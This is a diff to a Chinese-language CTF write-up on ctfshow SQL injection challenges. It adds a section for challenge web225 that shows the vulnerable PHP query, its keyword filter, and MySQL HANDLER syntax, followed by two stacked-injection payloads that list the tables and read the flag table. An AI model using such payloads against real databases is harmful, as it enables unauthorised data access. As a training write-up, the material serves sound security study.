@@ -1713,8 +1713,51 @@ for i in range(9, 46):
         }
         r = requests.get(url=url, params=params)
  
-        if 'passwordAUTO' in r.text: # 回显passwordAUTO，证明查询成功
+		if 'passwordAUTO' in r.text: # 回显passwordAUTO，证明查询成功
             low = mid # 查询成功，区间向右靠拢
         else:
             high = mid # 查询失败，区间向左靠拢
 ```
+
+## web225（handler）
+
+```sql
+  //分页查询
+  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
+      
+返回逻辑
+
+  //师傅说过滤的越多越好
+  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)){
+    die(json_encode($ret));
+  }
+ 
+```
+
+堆叠注入，常规的查询被ban了，考虑使用handler，先看官网文档说明
+
+>HANDLER *tbl_name* OPEN [ [AS] *alias*] 
+>
+>HANDLER *tbl_name* READ *index_name* { = | <= | >= | < | > } (*value1*,*value2*,...)    
+>
+>​	[ WHERE *where_condition* ] [LIMIT ... ] 
+>
+>HANDLER *tbl_name* READ *index_name* { FIRST | NEXT | PREV | LAST }    
+>
+>​	[ WHERE *where_condition* ] [LIMIT ... ] 
+>
+>HANDLER *tbl_name* READ { FIRST | NEXT }    
+>
+>​	[ WHERE *where_condition* ] [LIMIT ... ] 
+>
+>HANDLER *tbl_name* CLOSE
+
+handler能够一行一行的浏览一个表中的数据，但是 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。
+
+首先查表：`payload：ctfshow';show tables;`
+
+![image-20220113183036894](image/ctfshow-sql注入 （171-253）/image-20220113183036894.png)
+
+然后查表中内容，`payload：ctfshow';handler ctfshow_flagasa open;handler ctfshow_flagasa read first;`
+
+![image-20220113183231895](image/ctfshow-sql注入 （171-253）/image-20220113183231895.png)
